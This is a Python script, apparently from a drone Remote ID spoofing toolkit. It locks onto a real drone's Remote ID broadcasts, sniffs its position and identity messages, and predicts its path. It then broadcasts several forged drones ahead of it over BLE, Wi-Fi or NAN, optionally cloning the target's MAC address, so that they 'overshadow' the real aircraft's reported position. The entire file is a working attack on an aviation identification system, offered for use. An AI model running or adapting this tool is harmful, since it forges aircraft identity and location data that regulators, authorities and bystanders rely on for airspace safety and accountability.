#!/usr/bin/env python3
from drone_rid_spoofer.helpers import generate_ble_mac
from drone_rid_spoofer.helpers import generate_wifi_mac
import argparse
import logging
import math
import struct
import time
import random

from drone_rid_spoofer.state import DroneState
from drone_rid_spoofer.transport.ble import BleExtendedBackend, BleLegacyBackend
from drone_rid_spoofer.transport.wifi import WifiBackend
from drone_rid_spoofer.transport.nan import NanBackend
from drone_rid_spoofer.messages import _encode_speed, _transform_rotation
from drone_rid_spoofer.takeover import TakeoverSpoofer, make_valid_ble_mac, make_valid_wifi_mac

logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

def calculate_kinematics(lat1_int, lon1_int, lat2_int, lon2_int, dt_seconds):
    lat1 = math.radians(lat1_int / 1e7)
    lon1 = math.radians(lon1_int / 1e7)
    lat2 = math.radians(lat2_int / 1e7)
    lon2 = math.radians(lon2_int / 1e7)
    
    dlon = lon2 - lon1
    
    a = math.sin((lat2 - lat1)/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
    c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
    distance = 6371000 * c
    speed = distance / dt_seconds if dt_seconds > 0 else 0
    
    x = math.sin(dlon) * math.cos(lat2)
    y = math.cos(lat1) * math.sin(lat2) - (math.sin(lat1) * math.cos(lat2) * math.cos(dlon))
    initial_bearing = math.atan2(x, y)
    bearing_degrees = (math.degrees(initial_bearing) + 360) % 360
    
    return speed, int(bearing_degrees)

def extrapolate_location(lat_int, lon_int, speed_mps, bearing_deg, dt_seconds):
    R = 6371000.0
    distance = speed_mps * dt_seconds
    
    lat_rad = math.radians(lat_int / 1e7)
    lon_rad = math.radians(lon_int / 1e7)
    bearing_rad = math.radians(bearing_deg)
    
    new_lat_rad = math.asin(math.sin(lat_rad) * math.cos(distance / R) + 
                            math.cos(lat_rad) * math.sin(distance / R) * math.cos(bearing_rad))
                            
    new_lon_rad = lon_rad + math.atan2(math.sin(bearing_rad) * math.sin(distance / R) * math.cos(lat_rad),
                                       math.cos(distance / R) - math.sin(lat_rad) * math.sin(new_lat_rad))
                                       
    return int(math.degrees(new_lat_rad) * 1e7), int(math.degrees(new_lon_rad) * 1e7)


class PredictiveTakeover(TakeoverSpoofer):
    def __init__(self, adapter="hci0", num_drones: int = 7, mac_mode: str = "random"):
        super().__init__(adapter)
        self.num_drones = num_drones
        self.mac_mode = mac_mode
        self.prev_lat = None
        self.prev_lon = None
        self.prev_time = None
        
        self.current_speed = 0.0
        self.current_heading = 0
        
        self.drone_states = None

    def on_packet_received(self, location_data: dict, messages: list):
        """
        Triggered dynamically every time we sniff a fresh packet from the locked-on drone!
        We calculate its true kinematic velocity, extrapolate its position into the future,
        and update the state so the backend automatically broadcasts the predictive overlay.
        """
        now = time.time()
        lat_int = int(location_data['lat'] * 1e7)
        lon_int = int(location_data['lon'] * 1e7)
        
        if self.prev_lat is not None and self.prev_time is not None:
            dt = now - self.prev_time
            if dt > 0.05: # Prevent divide by zero on burst packets
                speed, heading = calculate_kinematics(self.prev_lat, self.prev_lon, lat_int, lon_int, dt)
                
                # Smooth out GPS noise using a simple low-pass filter
                self.current_speed = (self.current_speed * 0.5) + (speed * 0.5)
                self.current_heading = heading # Immediate turn response
                
                # Extrapolate 1.5 seconds into the future to completely overshadow the real drone's position
                extrapolated_lat, extrapolated_lon = extrapolate_location(lat_int, lon_int, self.current_speed, self.current_heading, 1.5)
                
                if self.drone_states:
                    for d in self.drone_states:
                        # add some uncertainty making sure to keep the int typing correct
                        d.lat = int((extrapolated_lat/1e7 + random.uniform(-0.0001, 0.0001)) * 1e7)
                        d.lng = int((extrapolated_lon/1e7 + random.uniform(-0.0001, 0.0001)) * 1e7)
                        d.speed = self.current_speed
                        d.direction = self.current_heading
                        d.geodetic_altitude = location_data['alt']
                    logging.info(f"Predictive Update: Heading {heading}°, Speed {speed:.1f}m/s -> Spoofing ahead!")
                
        self.prev_lat = lat_int
        self.prev_lon = lon_int
        self.prev_time = now

    def run_spoofing(self, transport="ble5", wifi_iface="wlan1", interval=200, nan_port=8080):
        if transport == "nan" and self.mac_mode == "captured":
            raise ValueError("Transport 'nan' is incompatible with mac_mode='captured' (NAN publish sessions cannot force captured hardware addresses).")
        logging.info("Starting predictive kinematics takeover...")
        
        start_lat = self.last_location_data['lat']
        start_lng = self.last_location_data['lon']
        
        # If crossing domains, ensure the spoofed MAC complies with specs
        captured_ble_mac = make_valid_ble_mac(self.target_mac)
        captured_wifi_mac = make_valid_wifi_mac(self.target_mac)
        
        self.drone_states = []
        for i in range(self.num_drones):
            if self.mac_mode == "captured":
                wifi_mac = captured_wifi_mac
                ble_mac = captured_ble_mac
            else:
                wifi_mac = generate_wifi_mac()
                ble_mac = generate_ble_mac()
                
            self.drone_states.append(DroneState(
                # serial should show its spoofed serial number, not the original drone's
                # clipped to the 24byte limit
                serial=b"FAKE"+self.basic_id[:16],
                pilot_location=(int(start_lat*1e7), int(start_lng*1e7)),
                lat=int(start_lat*1e7),
                lng=int(start_lng*1e7),
                mac_address=wifi_mac,
                ble_address=ble_mac,
                mode="hover",
                waypoints=[],
                geodetic_altitude=self.last_location_data['alt']
            ))
        
        def hybrid_packet_builder(drone: DroneState) -> list:
            raw_loc = bytearray(self.raw_location_msg)
            
            # Update kinematics using the extrapolated predictive values updated by the callback
            raw_loc[5:9] = struct.pack("<i", drone.lat)
            raw_loc[9:13] = struct.pack("<i", drone.lng)
            raw_loc[3] = _encode_speed(drone.speed)
            
            dir_val, ew_dir = _transform_rotation(drone.direction)
            raw_loc[1] = (raw_loc[1] & 0xFD) | (ew_dir & 0x02)
            raw_loc[2] = int(dir_val)
            
            combined_msgs = [bytes(raw_loc)]
            
            for msg in self.captured_static_messages:
                msg_type = msg[0] >> 4
                mut_msg = bytearray(msg)
                
                if msg_type == 0x0: # Basic ID
                    mut_msg[2:22] = struct.pack("<20s", drone.serial)
                # elif msg_type == 0x4: # System
                #     mut_msg[2:6] = struct.pack("<i", drone.pilot_location[0])
                #     mut_msg[6:10] = struct.pack("<i", drone.pilot_location[1])
                    
                combined_msgs.append(bytes(mut_msg))
                
            combined_msgs.sort(key=lambda m: m[0] >> 4)
            return combined_msgs

        logging.info(f"Broadcasting predictive spoof on {transport.upper()} for MAC {self.target_mac}...")
        
        if transport == "ble5":
            backend = BleExtendedBackend(adapter=self.adapter, pure_bt5=True, extended_interval_ms=interval)
        elif transport == "ble4":
            backend = BleLegacyBackend(adapter=self.adapter, advertising_interval_ms=interval)
        elif transport == "wifi":
            backend = WifiBackend(interface=wifi_iface)
        elif transport == "nan":
            backend = NanBackend(port=nan_port)
        else:
            raise ValueError(f"Unknown transport {transport}")
            
        backend.start(self.drone_states, hybrid_packet_builder)
        
        try:
            # The backend handles its own broadcast loop (or BLE controller handles it).
            # We simply sit here, and our background sniffer thread fires `on_packet_received`
            # whenever the real drone transmits, magically updating the broadcast state!
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            backend.close()
            logging.info("Predictive Takeover complete.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Predictive Takeover of a Remote ID Drone")
    parser.add_argument("-i", "--interface", default="hci0", help="BLE adapter (default: hci0)")
    parser.add_argument("-w", "--wifi-iface", default=None, help="Wi-Fi Monitor Interface (default: None)")
    parser.add_argument("-t", "--transport", choices=["ble5", "ble4", "wifi", "nan"], default="ble5", help="Transport medium to broadcast spoof on (default: ble5)")
    parser.add_argument("--nan-port", type=int, default=8080, help="TCP port for NAN Android bridge (default: 8080)")
    parser.add_argument("-n", "--num-drones", default=7, type=int, help="Number of spoofed drones to broadcast (default: 7)")
    parser.add_argument("-a", "--interval", type=int, default=200, help="Advertising interval in milliseconds for BLE (default: 200)")
    parser.add_argument("--mac-mode", choices=["random", "captured"], default="random", help="Whether the spoofed drones should use random MAC addresses or the captured target's MAC (default: random)")
    args = parser.parse_args()
    
    if args.transport == "nan" and args.mac_mode == "captured":
        parser.error("Transport 'nan' is incompatible with --mac-mode=captured (NAN publish sessions require unique identifiers and cannot force captured hardware addresses).")
    
    takeover = PredictiveTakeover(adapter=args.interface, num_drones=args.num_drones, mac_mode=args.mac_mode)
    
    ble_scan_type = args.transport if args.transport in ["ble4", "ble5"] else "ble5"
    takeover.start_sniffing(ble_interface=args.interface, ble_scan_type=ble_scan_type, wifi_iface=args.wifi_iface, continuous=True)
    
    if takeover.target_mac:
        try:
            takeover.run_spoofing(transport=args.transport, wifi_iface=args.wifi_iface, interval=args.interval, nan_port=args.nan_port)
        finally:
            takeover.stop_sniffing()
